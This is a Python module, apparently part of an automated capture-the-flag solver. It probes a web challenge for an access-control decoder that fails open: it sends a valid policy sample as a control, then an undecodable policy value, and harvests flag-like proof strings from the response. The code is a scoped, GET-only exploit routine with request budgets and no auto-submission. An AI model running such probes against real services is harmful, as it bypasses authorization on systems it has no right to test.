#!/usr/bin/env python3
"""Exact-contract reader for a remote-policy decoder which fails open.

This is a narrow, GET-only peer for :mod:`proof_hunt`.  It sends nothing unless
the already-cached ``/api/clues`` document names all of the following:

* a same-origin feature route;
* a distinct same-origin policy-format route;
* an expected deny-on-policy-service-failure behaviour.

The policy-format response must then advertise one query parameter, a prefix,
``base64url UTF-8 JSON`` encoding, and a decodable public/allowed sample.  The
sample is replayed as a plain control.  Only after that control is accepted does
the reader send one value with the advertised prefix and an invalid base64url
suffix.  A proof is eligible only in a coherent JSON response whose exact effect
is ``exceptional_condition_fail_open``.  No POST or redirect is possible.

The caller supplies the scope-locked WebClient, deadline, request budget and
stop event.  Target bytes are parsed as bounded text/JSON and are never
evaluated or deserialized.
"""

from __future__ import annotations

import base64
import datetime as _dt
import json
import os
import re
import sys
import threading
import time
import urllib.parse
from pathlib import Path


# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt

HERE = Path(__file__).resolve().parent
_TK = HERE.parent / "toolkits"
if str(_TK) not in sys.path:
    sys.path.insert(0, str(_TK))
if str(HERE) not in sys.path:
    sys.path.insert(0, str(HERE))

import web as _web  # noqa: E402 -- sole production transport and route guard
import post_chain as _shared  # noqa: E402 -- shared proof/carrier policy
import security_json as _security_json  # noqa: E402 -- duplicate-key rejecting JSON


REQUEST_TIMEOUT = 8.0
DEFAULT_SECONDS = 20.0
DEFAULT_MAX_REQUESTS = 4
DEADLINE_PAD = 0.3
MAX_TEXT = 400_000
MAX_ROUTE_BYTES = 1024
MAX_PREFIX_BYTES = 256
MAX_SAMPLE_BYTES = 4096

_PARAM = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,63}$")
_PREFIX = re.compile(r"^[A-Za-z0-9_.:-]{1,256}$")
_BASE64URL = re.compile(r"^[A-Za-z0-9_-]{2,4096}={0,2}$")
_EXPECTED_DENY = re.compile(
    r"(?is)\bdeny\b.{0,100}\baccess\b.{0,180}\b(?:policy|service|remote)\b.{0,180}"
    r"\b(?:unavailable|failure|failed|error|unreachable|exception)\b"
)
_FAIL_OPEN_EFFECT = "exceptional_condition_fail_open"
_LOW_ROLES = {"analyst", "user", "guest", "viewer", "member", "staff", "operator", "basic", "standard"}
_PROOF_SEEN = flagfmt.PROOF_ANYCASE
_CONTROL_DECISION_KEYS = frozenset({
    "ok", "allow", "allowed", "authorized", "success", "accepted",
    "status", "decision", "effect", "result", "outcome", "access", "policy",
})
_CONTROL_BOOLEAN_KEYS = frozenset({
    "ok", "allow", "allowed", "authorized", "success", "accepted",
})
_CONTROL_NEGATIVE = re.compile(
    r"(?:^|_)(?:false|no|deny|denied|denial|forbid|forbidden|reject|rejected|"
    r"unauthorized|blocked|refused|failure|failed|error)(?:_|$)"
)
_CONTROL_AFFIRMATIVE = {
    "true", "yes", "ok", "success", "accepted", "allow", "allowed",
    "authorized", "trusted", "standard", "ordinary", "public", "default",
}


def enabled() -> bool:
    raw = ctf_env.get("CTF_WEB_REMOTE_POLICY")
    if raw is not None:
        return raw.strip().lower() not in {"off", "0", "false", "no"}
    try:
        root = ctf_paths.workdir()
        return not (root / "_remote_policy.off").exists()
    except Exception:
        return False


def _snake(value) -> str:
    value = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", str(value or ""))
    return re.sub(r"[^a-z0-9]+", "_", value.lower()).strip("_")


def _origin(value):
    try:
        parsed = urllib.parse.urlsplit(str(value or ""))
        if (parsed.scheme not in ("http", "https") or not parsed.hostname
                or parsed.username is not None or parsed.password is not None):
            return None
        return (parsed.scheme, parsed.hostname.lower().rstrip("."),
                parsed.port or (443 if parsed.scheme == "https" else 80))
    except Exception:
        return None


def _response(raw):
    if not isinstance(raw, dict):
        return None
    if "body" in raw:
        return raw
    if "text" in raw:
        out = dict(raw)
        out["body"] = str(raw.get("text") or "").encode("utf-8", "replace")
        return out
    return None


def _ok(response) -> bool:
    return (isinstance(response, dict) and isinstance(response.get("status"), int)
            and 200 <= response["status"] < 300)


def _json(response):
    """Parse the response entity itself as bounded, duplicate-key-free JSON.

    The format document intentionally contains a base64url-encoded JSON sample.
    The shared carrier decoder exposes that sample as a second text view, so a
    multi-view ``loads_unique`` would reject the otherwise coherent outer
    document.  Authority remains the one wire entity, never the decoded sample.
    """
    if not isinstance(response, dict):
        return None
    pairs = response.get("response_header_pairs")
    if isinstance(pairs, (list, tuple)):
        header_pairs = [(str(row[0]), str(row[1])) for row in pairs
                        if isinstance(row, (list, tuple)) and len(row) == 2]
    else:
        headers = response.get("response_headers", response.get("headers", {}))
        header_pairs = ([(str(key), str(value)) for key, value in headers.items()]
                        if isinstance(headers, dict) else [])
    try:
        _web._validate_stream_framing(response.get("status"), header_pairs)
    except Exception:
        return None
    ctypes = [value.split(";", 1)[0].strip().lower() for key, value in header_pairs
              if key.strip().lower() == "content-type"]
    if len(set(ctypes)) != 1 or not ctypes or not (
            ctypes[0] == "application/json" or ctypes[0].endswith("+json")):
        return None
    body = response.get("body", response.get("text", ""))
    try:
        text = (bytes(body).decode("utf-8", "strict")
                if isinstance(body, (bytes, bytearray)) else str(body or ""))
        value = _security_json.loads(text, max_chars=MAX_TEXT)
    except Exception:
        return None
    return value if isinstance(value, (dict, list)) else None


def _safe_route(value, base_url):
    try:
        return _web.safe_same_origin_route(
            value, base_url, allow_query=False, max_bytes=MAX_ROUTE_BYTES)
    except Exception:
        return None


def _cached_clues(preloaded, base_url):
    """Return only an exact query-free /api/clues cache entry."""
    matches = []
    for raw_path, raw_response in list((preloaded or {}).items())[:80]:
        try:
            identity = _web.safe_preloaded_route_key(raw_path, base_url, max_bytes=MAX_ROUTE_BYTES)
        except Exception:
            identity = None
        if identity != "/api/clues":
            continue
        response = _response(raw_response)
        doc = _json(response)
        if _ok(response) and isinstance(doc, dict):
            matches.append((response, doc))
    return matches[0] if len(matches) == 1 else (None, None)


def _decode_sample(value):
    if not isinstance(value, str) or not _BASE64URL.fullmatch(value):
        return None
    try:
        padded = value + "=" * ((4 - len(value) % 4) % 4)
        raw = base64.b64decode(padded.encode("ascii"), altchars=b"-_", validate=True)
        if not raw or len(raw) > MAX_SAMPLE_BYTES:
            return None
        doc = _security_json.loads(raw.decode("utf-8", "strict"), max_chars=MAX_SAMPLE_BYTES)
    except Exception:
        return None
    return doc if isinstance(doc, dict) else None


def _public_allowed(doc) -> bool:
    if not isinstance(doc, dict):
        return False
    normalized = {_snake(key): value for key, value in doc.items()}
    allow = normalized.get("allow")
    scope = str(normalized.get("scope") or "").strip().lower()
    return allow is True and scope in {"public", "standard", "ordinary", "default"}


def _ordinary_allowed(doc) -> bool:
    """Require one unambiguous affirmative decision from the valid control.

    A 2xx JSON entity is only transport success.  In particular, ``ok:false``
    or a ``denied`` status must not authorize the malformed-policy payoff.
    Snake-equivalent duplicate decision fields are ambiguous and fail closed.
    """
    if not isinstance(doc, dict) or _shared._error(doc):
        return False
    fields = {}
    for raw_key, value in doc.items():
        key = _snake(raw_key)
        if key in _CONTROL_DECISION_KEYS:
            fields.setdefault(key, []).append(value)
    if any(len(values) != 1 for values in fields.values()):
        return False
    for key in _CONTROL_BOOLEAN_KEYS:
        if key in fields and not _shared._truthy(fields[key][0]):
            return False
    words = [_snake(values[0]) for key, values in fields.items()
             if key not in _CONTROL_BOOLEAN_KEYS and isinstance(values[0], str)]
    if any(_CONTROL_NEGATIVE.search(word) for word in words):
        return False
    return (any(_shared._truthy(fields[key][0]) for key in _CONTROL_BOOLEAN_KEYS if key in fields)
            or any(word in _CONTROL_AFFIRMATIVE for word in words))


def _contract(clues, format_doc, base_url):
    if not isinstance(clues, dict) or not isinstance(format_doc, dict):
        return None
    expected = str(clues.get("expected_behavior") or "")[:2000]
    role = str(clues.get("current_role") or "").strip().lower()
    if not _EXPECTED_DENY.search(expected) or (role and role not in _LOW_ROLES):
        return None
    feature = _safe_route(clues.get("feature_route"), base_url)
    format_route = _safe_route(clues.get("policy_format_route"), base_url)
    if not feature or not format_route or feature == format_route:
        return None
    param = format_doc.get("query_parameter")
    prefix = format_doc.get("prefix")
    encoding = _snake(format_doc.get("encoding"))
    sample = format_doc.get("sample_encoded")
    if (not isinstance(param, str) or not _PARAM.fullmatch(param)
            or not isinstance(prefix, str) or not prefix
            or len(prefix.encode("utf-8", "replace")) > MAX_PREFIX_BYTES
            or not _PREFIX.fullmatch(prefix)
            or any(ord(ch) < 0x20 or ord(ch) == 0x7f for ch in prefix)
            or not all(word in encoding for word in ("base64url", "utf_8", "json"))):
        return None
    decoded = _decode_sample(sample)
    advertised = format_doc.get("sample_decision")
    if not _public_allowed(decoded) or (advertised is not None and not _public_allowed(advertised)):
        return None
    return {"feature": feature, "format": format_route, "param": param,
            "prefix": prefix, "sample": sample}


def _with_policy(route, param, value):
    if not route or "?" in route:
        return None
    query = urllib.parse.urlencode([(param, value)], quote_via=urllib.parse.quote)
    path = route + "?" + query
    return path if len(path.encode("utf-8", "replace")) <= 8192 else None


class _Runner:
    def __init__(self, target, ctx):
        self.target = dict(target) if isinstance(target, dict) else {"url": str(target)}
        self.url = str(self.target.get("url") or "")
        self.ctx = dict(ctx or {})
        try:
            self.deadline = (float(self.ctx["deadline"]) if self.ctx.get("deadline") is not None
                             else time.time() + DEFAULT_SECONDS)
        except (TypeError, ValueError):
            self.deadline = time.time() + DEFAULT_SECONDS
        try:
            self.max_requests = max(0, int(self.ctx.get("max_requests", DEFAULT_MAX_REQUESTS)))
        except (TypeError, ValueError):
            self.max_requests = DEFAULT_MAX_REQUESTS
        self.external_stop = self.ctx.get("stop")
        self.preloaded = dict(self.ctx.get("preloaded") or {})
        supplied = list(self.ctx.get("baseline_texts") or [])
        self.baselines = [str(value or "")[:MAX_TEXT] for value in supplied[:80]]
        if len(supplied) > 80 and _shared.BASELINE_INCOMPLETE not in self.baselines:
            self.baselines.append(_shared.BASELINE_INCOMPLETE)
        for raw in list(self.preloaded.values())[:80]:
            response = _response(raw)
            if response is not None:
                value = _shared._baseline_text(response)
                if value not in self.baselines:
                    self.baselines.append(value)
        self.requests = 0
        self.posts = 0
        self.responses = []
        self.candidates = []
        self.success = False
        self.uuid4 = False
        self.where = None
        self.stopped = None
        self.t0 = time.time()
        self.client = None
        self._gate = threading.Lock()
        self._stopped = False

    def _may_send(self):
        if self._stopped or (hasattr(self.external_stop, "is_set") and self.external_stop.is_set()):
            self.stopped = self.stopped or "stopped"
            return False
        if self.requests >= self.max_requests:
            self.stopped = self.stopped or "max_requests"
            return False
        if self.deadline is not None and self.deadline - time.time() <= DEADLINE_PAD:
            self.stopped = self.stopped or "deadline"
            return False
        return True

    def _client(self):
        if self.client is not None:
            return self.client
        wanted = _origin(self.url)
        if wanted is None:
            self.stopped = "invalid target origin"
            return None
        try:
            candidate = self.ctx.get("client")
            if candidate is None and callable(self.ctx.get("client_factory")):
                candidate = self.ctx["client_factory"](self.url, REQUEST_TIMEOUT)
            if candidate is None:
                candidate = _web.WebClient(self.url, timeout=REQUEST_TIMEOUT)
            if _origin(getattr(candidate, "base", None)) != wanted:
                self.stopped = "client scope mismatch"
                return None
            self.client = candidate
            return candidate
        except Exception as exc:
            self.stopped = f"no scoped client: {type(exc).__name__}"
            return None

    def stop_now(self):
        with self._gate:
            self._stopped = True

    def get(self, path, role):
        route = _web.safe_same_origin_route(
            path, self.url, allow_query=True, guard_query=False, max_bytes=8192)
        if route is None:
            self.stopped = self.stopped or "unsafe remote-policy request"
            return None
        with self._gate:
            client = self._client()
            if client is None or not self._may_send():
                return None
            try:
                left = self.deadline - time.time() if self.deadline is not None else None
                client.timeout = REQUEST_TIMEOUT if left is None else max(0.2, min(REQUEST_TIMEOUT, left - 0.1))
            except Exception:
                pass
            self.requests += 1
            try:
                response = client.request("GET", route, allow_redirects=False)
            except Exception as exc:
                self.responses.append({"role": role, "path": route.split("?", 1)[0],
                                       "status": None, "error": type(exc).__name__})
                self.stopped = self.stopped or f"transport: {type(exc).__name__}"
                self._stopped = True
                return None
            response = _response(response)
            self.responses.append({"role": role, "path": route.split("?", 1)[0],
                                   "status": response.get("status") if response else None})
            return response

    def _allow_route(self, route):
        allowed = self.ctx.get("route_allowed")
        if not callable(allowed):
            return True
        try:
            return bool(allowed(route))
        except Exception:
            return False

    def run(self):
        if not enabled():
            self.stopped = "off"
            return None
        clue_response, clues = _cached_clues(self.preloaded, self.url)
        if clue_response is None:
            self.stopped = "no exact cached remote-policy clue contract"
            return None
        expected = str(clues.get("expected_behavior") or "")[:2000]
        feature = _safe_route(clues.get("feature_route"), self.url)
        format_route = _safe_route(clues.get("policy_format_route"), self.url)
        if not _EXPECTED_DENY.search(expected) or not feature or not format_route:
            self.stopped = "no exact remote-policy clue contract"
            return None
        if not self._allow_route(feature) or not self._allow_route(format_route):
            self.stopped = "caller route policy refused remote-policy route"
            return None
        if self.max_requests - self.requests < 3 or not self._may_send():
            self.stopped = self.stopped or "insufficient budget for policy format and controls"
            return None

        format_response = self.get(format_route, "policy-format-control")
        format_doc = _json(format_response)
        contract = _contract(clues, format_doc, self.url) if _ok(format_response) else None
        if contract is None:
            self.stopped = self.stopped or "policy format did not confirm the exact decoder contract"
            return None
        self.baselines.append(_shared._baseline_text(format_response))

        control_path = _with_policy(
            contract["feature"], contract["param"], contract["prefix"] + contract["sample"])
        control = self.get(control_path, "valid-policy-control")
        control_doc = _json(control)
        self.baselines.append(_shared._baseline_text(control))
        control_text = _shared._baseline_text(control)
        if (not _ok(control) or not _ordinary_allowed(control_doc)
                or _snake(control_doc.get("effect")) == _FAIL_OPEN_EFFECT
                or _shared.PAYOFF_LIKE.search(control_text)):
            self.stopped = "valid policy control did not establish an ordinary allowed decision"
            return None

        malformed_path = _with_policy(
            contract["feature"], contract["param"], contract["prefix"] + "!")
        payoff = self.get(malformed_path, "undecodable-policy-payoff")
        doc = _json(payoff)
        if (not _ok(payoff) or not isinstance(doc, dict) or _shared._error(doc)
                or not _shared._truthy(doc.get("ok"))
                or _snake(doc.get("effect")) != _FAIL_OPEN_EFFECT):
            self.stopped = "undecodable policy did not produce the exact fail-open effect"
            return None
        anchor, siblings = _shared._coherent_json_view(payoff, doc)
        if anchor is None:
            self.stopped = "fail-open effect did not occupy one coherent JSON carrier"
            return None
        sibling_candidates = _shared._carrier_candidates(siblings)
        if sibling_candidates:
            self.success = True
            self.where = "remote_policy:undecodable"
            self.candidates = sibling_candidates[:12]
            self.stopped = "fail-open anchor and proof/candidate occupied different carrier views"
            return None
        synthetic = dict(payoff)
        synthetic["body"] = anchor.encode("utf-8", "replace")
        synthetic["response_headers"] = {"Content-Type": "application/json"}
        synthetic.pop("response_header_pairs", None)
        synthetic.pop("headers", None)
        info = _shared.extract_anchored(
            synthetic, self.baselines, anchored=True,
            host=urllib.parse.urlsplit(self.url).hostname,
        )
        self.success = True
        self.where = "remote_policy:undecodable"
        self.uuid4 = bool(info.get("uuid4"))
        self.candidates = list(info.get("candidates") or [])[:12]
        if info.get("auto") is None:
            self.stopped = "fail-open effect carried no single novel strict proof"
        return info.get("auto")

    def summary(self, proof):
        incomplete = (_shared._proof_policy is not None
                      and hasattr(_shared._proof_policy, "baseline_set_incomplete")
                      and _shared._proof_policy.baseline_set_incomplete(self.baselines))
        return {"proof": proof, "class": "remote_policy_fail_open", "success": self.success,
                "terminal": False, "candidates": list(dict.fromkeys(self.candidates))[:12],
                "uuid4": self.uuid4,
                "baseline_proofs": list(dict.fromkeys(
                    match.group(0) for text in self.baselines
                    for match in _PROOF_SEEN.finditer(str(text or ""))))[:24],
                "baseline_incomplete": bool(incomplete), "requests": self.requests, "posts": 0,
                "seconds": round(time.time() - self.t0, 3), "where": self.where,
                "stopped": self.stopped, "responses": self.responses[:12]}


def _surface(runner, ctx):
    evidence = ctx.get("evidence") if isinstance(ctx, dict) else None
    if not isinstance(evidence, list):
        return
    aid = runner.target.get("answer_id") or "target"
    for value in list(dict.fromkeys(runner.candidates))[:6]:
        line = _web.safe_display_text(
            f"WEB REMOTE-POLICY CANDIDATE {aid}: {value} (fail-open response; not auto-submitted)", 600)
        if line not in evidence:
            evidence.append(line)


def solve(target, ctx=None):
    """Solve one target; never raises and never submits."""
    ctx = dict(ctx or {})
    runner = _Runner(target, ctx)
    proof = None
    try:
        proof = runner.run()
    except Exception as exc:
        runner.stopped = runner.stopped or f"error: {type(exc).__name__}"
    finally:
        runner.stop_now()
    _surface(runner, ctx)
    summary = runner.summary(proof)
    aid = runner.target.get("answer_id") or "target"
    sink = ctx.get("result_sink")
    if isinstance(sink, dict):
        sink[aid] = summary
    _write_log(ctx.get("log_dir"), ctx.get("challenge"), aid, summary)
    return proof


def solve_targets(targets, ctx=None):
    out = {}
    for index, target in enumerate(list(targets or [])):
        if not isinstance(target, dict):
            continue
        item = dict(target)
        aid = str(item.get("answer_id") or item.get("id") or f"target-{index + 1}")
        item["answer_id"] = aid
        out[aid] = solve(item, ctx)
    return out


def _write_log(log_dir, challenge, aid, summary):
    if not log_dir:
        return
    try:
        folder = Path(log_dir)
        folder.mkdir(parents=True, exist_ok=True)
        row = {"at": _dt.datetime.now().astimezone().isoformat(timespec="seconds"),
               "challenge": challenge, "answer_id": aid, **summary}
        with (folder / "remote_policy.jsonl").open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(row, separators=(",", ":"), default=str) + "\n")
    except Exception:
        pass


__all__ = ["DEFAULT_MAX_REQUESTS", "DEFAULT_SECONDS", "enabled", "solve", "solve_targets"]
